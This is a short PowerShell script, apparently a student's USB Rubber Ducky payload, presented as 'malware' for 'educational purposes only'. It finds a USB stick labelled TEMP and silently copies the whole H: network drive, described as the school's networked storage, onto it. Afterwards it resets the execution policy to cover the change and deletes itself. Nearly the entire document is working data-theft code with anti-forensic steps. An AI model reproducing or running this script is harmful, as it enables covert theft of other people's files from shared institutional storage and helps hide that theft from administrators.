# H DRIVE SIPHONING "MALWARE"
# By Cayden Wright
# Nov 18 2021
# Downloads the H Drive (networked storage at my school) to any USB drive named "TEMP"
# For educational purposes only
# used with a USB rubber ducky

#get drive letter of USB stick
$driveLetter = (Get-Volume -FileSystemLabel TEMP).DriveLetter

#create folder with current date/time
$folderName= Get-Date -Format "MM_dd_yyyy HH-mm"
New-Item -Path "${driveLetter}:\" -Name "$folderName" -ItemType "directory"

#copy the H drive
Copy-Item -Path "H:\*" -Destination "${driveLetter}:\${folderName}" -Recurse

#Reset ExecutionPolicy as originally set by the duck
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser

#THIS IS THE SELF DESTRUCT LINE
Remove-Item -Path $MyInvocation.MyCommand.Source